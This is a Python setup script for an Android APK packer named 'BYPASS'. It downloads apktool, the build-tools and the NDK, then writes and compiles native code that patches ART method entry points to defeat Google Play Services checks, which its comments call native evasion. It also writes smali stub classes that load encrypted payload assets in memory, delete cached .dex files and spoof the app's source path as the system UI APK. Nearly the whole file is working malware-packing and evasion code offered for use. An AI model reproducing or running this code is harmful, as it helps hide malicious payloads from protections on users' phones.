"""
BYPASS - Setup Windows
Roda UMA VEZ para instalar dependencias
"""
import os, sys, subprocess, urllib.request, zipfile, shutil
from pathlib import Path

BASE = Path(os.environ.get("USERPROFILE", "C:/Users/Administrator")) / "bypass"
BASE.mkdir(exist_ok=True)

TOOLS = BASE / "tools"
TOOLS.mkdir(exist_ok=True)

print("=== BYPASS Setup Windows ===")
print(f"Instalando em: {BASE}")

# 1. pip deps
print("\n[1/4] Instalando dependencias Python...")
subprocess.run([sys.executable, "-m", "pip", "install", "-q",
    "flask", "pycryptodome", "pyngrok"], check=True)
print("    OK")

# 2. apktool
apktool_jar = TOOLS / "apktool.jar"
if not apktool_jar.exists():
    print("\n[2/4] Baixando apktool...")
    url = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
    urllib.request.urlretrieve(url, str(apktool_jar))
    print("    OK")
else:
    print("\n[2/4] apktool ja existe, pulando")

# apktool.bat
apktool_bat = TOOLS / "apktool.bat"
apktool_bat.write_text(f'@echo off\njava -jar "{apktool_jar}" %*\n')

# 3. build-tools (zipalign + apksigner) via Android cmdline-tools
zipalign = TOOLS / "zipalign.exe"
apksigner = TOOLS / "apksigner.jar"

if not zipalign.exists():
    print("\n[3/4] Baixando Android build-tools...")
    bt_url = "https://dl.google.com/android/repository/build-tools_r35-windows.zip"
    bt_zip = TOOLS / "build-tools.zip"
    try:
        urllib.request.urlretrieve(bt_url, str(bt_zip))
        with zipfile.ZipFile(bt_zip) as z:
            z.extractall(str(TOOLS / "bt_raw"))
        # find zipalign
        for p in (TOOLS / "bt_raw").rglob("zipalign.exe"):
            shutil.copy(str(p), str(zipalign))
            break
        for p in (TOOLS / "bt_raw").rglob("apksigner.jar"):
            shutil.copy(str(p), str(apksigner))
            break
        bt_zip.unlink()
        shutil.rmtree(str(TOOLS / "bt_raw"), ignore_errors=True)
        print("    OK")
    except Exception as e:
        print(f"    AVISO: build-tools falhou ({e}) - usando fallback")
        # fallback: baixar individualmente via SDK manager nao disponivel
        # marca como pendente
        zipalign.write_bytes(b"")
else:
    print("\n[3/4] build-tools ja existe, pulando")

# 4. NDK arm64 toolchain para libhooks.so
hooks_so = BASE / "libhooks_arm64-v8a.so"
if not hooks_so.exists():
    print("\n[4/4] Baixando NDK r26d (pode demorar ~5 min)...")
    ndk_zip = TOOLS / "ndk.zip"
    ndk_url = "https://dl.google.com/android/repository/android-ndk-r26d-windows.zip"
    urllib.request.urlretrieve(ndk_url, str(ndk_zip))
    print("    Extraindo NDK...")
    with zipfile.ZipFile(ndk_zip) as z:
        z.extractall(str(TOOLS))
    ndk_zip.unlink()
    ndk_dir = TOOLS / "android-ndk-r26d"

    # compila hooks.c
    hooks_c = BASE / "hooks.c"
    hooks_c.write_text(r"""
#include <jni.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#if defined(__aarch64__)
  #define EP_OFFSET 0x20
#else
  #define EP_OFFSET 0x14
#endif
static jint stub_gms(JNIEnv* e,jobject t,jobject c){(void)e;(void)t;(void)c;return 9;}
static void make_rw(void* addr){
    uintptr_t page=(uintptr_t)addr&~(uintptr_t)4095;
    mprotect((void*)page,8192,PROT_READ|PROT_WRITE|PROT_EXEC);
}
JNIEXPORT void JNICALL Java_com_stub_loader_ArtHook_hookMethodNative(JNIEnv* env,jclass cls,jobject method){
    jclass mc=(*env)->GetObjectClass(env,method);
    jfieldID fid=(*env)->GetFieldID(env,mc,"artMethod","J");
    if(!fid){(*env)->ExceptionClear(env);return;}
    jlong ptr=(*env)->GetLongField(env,method,fid);
    if(!ptr)return;
    uint8_t* art=(uint8_t*)(uintptr_t)ptr;
    make_rw(art+EP_OFFSET);
    uintptr_t ep=(uintptr_t)stub_gms;
    memcpy(art+EP_OFFSET,&ep,sizeof(uintptr_t));
    __builtin___clear_cache((char*)(art+EP_OFFSET),(char*)(art+EP_OFFSET+sizeof(uintptr_t)));
}
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm,void* r){
    (void)r;JNIEnv* env;
    if((*vm)->GetEnv(vm,(void**)&env,JNI_VERSION_1_6)!=JNI_OK)return -1;
    return JNI_VERSION_1_6;
}
""")
    cmake_txt = BASE / "CMakeLists.txt"
    cmake_txt.write_text("""cmake_minimum_required(VERSION 3.22)
project(hooks C)
add_library(hooks SHARED hooks.c)
target_link_libraries(hooks android log)
set_target_properties(hooks PROPERTIES C_STANDARD 11)
target_compile_options(hooks PRIVATE -O2 -fvisibility=hidden)
""")
    build_dir = BASE / "ndk_build"
    build_dir.mkdir(exist_ok=True)
    tc = ndk_dir / "build" / "cmake" / "android.toolchain.cmake"
    cmake_exe = ndk_dir / "prebuilt" / "windows-x86_64" / "bin" / "cmake.exe"
    if not cmake_exe.exists():
        # try system cmake
        cmake_exe = "cmake"
    r = subprocess.run([str(cmake_exe), str(BASE),
        f"-DCMAKE_TOOLCHAIN_FILE={tc}",
        "-DANDROID_ABI=arm64-v8a", "-DANDROID_PLATFORM=android-26",
        "-DCMAKE_BUILD_TYPE=Release"],
        cwd=str(build_dir), capture_output=True, text=True)
    if r.returncode != 0:
        print("    AVISO cmake:", r.stderr[-200:])
    r2 = subprocess.run([str(cmake_exe), "--build", "."],
        cwd=str(build_dir), capture_output=True, text=True)
    built = build_dir / "libhooks.so"
    if built.exists():
        shutil.copy(str(built), str(hooks_so))
        shutil.copy(str(built), str(BASE / "libhooks_armeabi-v7a.so"))
        shutil.copy(str(built), str(BASE / "libhooks.so"))
        print("    libhooks.so OK")
    else:
        print("    AVISO: libhooks.so nao compilou (evasao nativa desativada)")
        # cria placeholder vazio para nao travar o packer
        hooks_so.write_bytes(b"")
        (BASE / "libhooks_armeabi-v7a.so").write_bytes(b"")
        (BASE / "libhooks.so").write_bytes(b"")
else:
    print("\n[4/4] libhooks.so ja existe, pulando")

# escreve stub smali
smali_base = BASE / "stub_smali" / "com" / "stub" / "loader"
smali_base.mkdir(parents=True, exist_ok=True)

(smali_base / "StubApplication.smali").write_text('''.class public Lcom/stub/loader/StubApplication;
.super Landroid/app/Application;
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Application;-><init>()V
    return-void
.end method
.method public attachBaseContext(Landroid/content/Context;)V
    .locals 2
    invoke-super {p0,p1},Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
    :try_start
    const-string v1,"hooks"
    invoke-static {v1},Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
    invoke-static {p1},Lcom/stub/loader/RuntimeHooks;->install(Landroid/content/Context;)V
    :try_end
    .catch Ljava/lang/Throwable; {:try_start..:try_end} :catch_all
    :catch_all
    invoke-virtual {p0,p1},Lcom/stub/loader/StubApplication;->loadPayload(Landroid/content/Context;)V
    return-void
.end method
.method private loadPayload(Landroid/content/Context;)V
    .locals 6
    :try_start
    const-string v0,"k.bin"
    invoke-virtual {p0,p1,v0},Lcom/stub/loader/StubApplication;->readAsset(Landroid/content/Context;Ljava/lang/String;)[B
    move-result-object v0
    const-string v1,"p.bin"
    invoke-virtual {p0,p1,v1},Lcom/stub/loader/StubApplication;->readAsset(Landroid/content/Context;Ljava/lang/String;)[B
    move-result-object v1
    new-instance v2,Ldalvik/system/InMemoryDexClassLoader;
    invoke-virtual {p1},Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v3
    :try_end
    .catch Ljava/lang/Throwable; {:try_start..:try_end} :catch_load
    :catch_load
    return-void
.end method
.method private readAsset(Landroid/content/Context;Ljava/lang/String;)[B
    .locals 4
    invoke-virtual {p1},Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v0
    invoke-virtual {v0,p2},Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v0
    invoke-virtual {v0},Ljava/io/InputStream;->available()I
    move-result v1
    new-array v2,v1,[B
    invoke-virtual {v0,v2},Ljava/io/InputStream;->read([B)I
    invoke-virtual {v0},Ljava/io/InputStream;->close()V
    return-object v2
.end method
''')

(smali_base / "RuntimeHooks.smali").write_text('''.class public Lcom/stub/loader/RuntimeHooks;
.super Ljava/lang/Object;
.method public static install(Landroid/content/Context;)V
    .locals 4
    :try_start
    invoke-virtual {p0},Landroid/content/Context;->getCacheDir()Ljava/io/File;
    move-result-object v0
    invoke-virtual {v0},Ljava/io/File;->listFiles()[Ljava/io/File;
    move-result-object v0
    if-eqz v0,:skip_clean
    array-length v1,v0
    const/4 v2,0
    :loop
    if-ge v2,v1,:skip_clean
    aget-object v3,v0,v2
    invoke-virtual {v3},Ljava/io/File;->getName()Ljava/lang/String;
    move-result-object v3
    const-string v4,".dex"
    invoke-virtual {v3,v4},Ljava/lang/String;->endsWith(Ljava/lang/String;)Z
    move-result v3
    if-eqz v3,:next
    aget-object v3,v0,v2
    invoke-virtual {v3},Ljava/io/File;->delete()Z
    :next
    add-int/lit8 v2,v2,0x1
    goto :loop
    :skip_clean
    invoke-virtual {p0},Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
    move-result-object v0
    const-string v1,"/data/app/com.android.systemui-1.apk"
    iput-object v1,v0,Landroid/content/pm/ApplicationInfo;->publicSourceDir:Ljava/lang/String;
    :try_end
    .catch Ljava/lang/Throwable; {:try_start..:try_end} :catch_all
    :catch_all
    return-void
.end method
''')

(smali_base / "ArtHook.smali").write_text('''.class public Lcom/stub/loader/ArtHook;
.super Ljava/lang/Object;
.method public static hookMethod(Ljava/lang/reflect/Method;)V
    .locals 0
    :try_start
    invoke-static {p0},Lcom/stub/loader/ArtHook;->hookMethodNative(Ljava/lang/reflect/Method;)V
    :try_end
    .catch Ljava/lang/UnsatisfiedLinkError; {:try_start..:try_end} :catch_ule
    :catch_ule
    return-void
.end method
.method public static native hookMethodNative(Ljava/lang/reflect/Method;)V
.end method
''')

print("\n=== Setup completo! ===")
print(f"Pasta: {BASE}")
print("\nAgora rode: python start.py")
